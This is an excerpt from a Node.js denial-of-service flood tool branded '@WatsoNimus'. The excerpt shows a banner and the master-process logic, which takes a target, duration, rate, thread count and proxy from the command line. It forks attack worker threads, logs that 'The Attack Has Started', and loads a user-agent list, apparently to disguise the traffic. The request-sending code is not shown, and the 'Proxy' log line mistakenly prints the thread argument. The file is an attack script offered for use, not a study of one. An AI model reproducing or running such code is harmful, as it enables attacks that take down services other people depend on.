...
if (cluster.isMaster){
 ...
 ░ ░   ░   ░   ▒    ░    ░▒ ▒ ░░  
       ░       ░  ░ ░     ░ ░     
                         ░░ ░     
  `)
  console.log(`[@WatsoNimus] Time: ${getCurrentTime()}`)
  console.log(`------------------------------------------`)
  console.log(`[@WatsoNimus] Target: `+ process.argv[2])
  console.log(`[@WatsoNimus] Time: `+ process.argv[3])
  console.log(`[@WatsoNimus] Rate: `+ process.argv[4])
  console.log(`[@WatsoNimus] Thread: ` + process.argv[5])
  console.log(`[@WatsoNimus] Proxy: ` + process.argv[5])
  console.log(`------------------------------------------`)
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`[@WatsoNimus] ${getCurrentTime()} Attack Thread ${i} Started`);
  }
  console.log(`[@WatsoNimus] ${getCurrentTime()} The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`[@WatsoNimus] ${getCurrentTime()} The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
...
const uap = fs.readFileSync('./ua.txt', 'utf-8').split('\n').filter(Boolean);
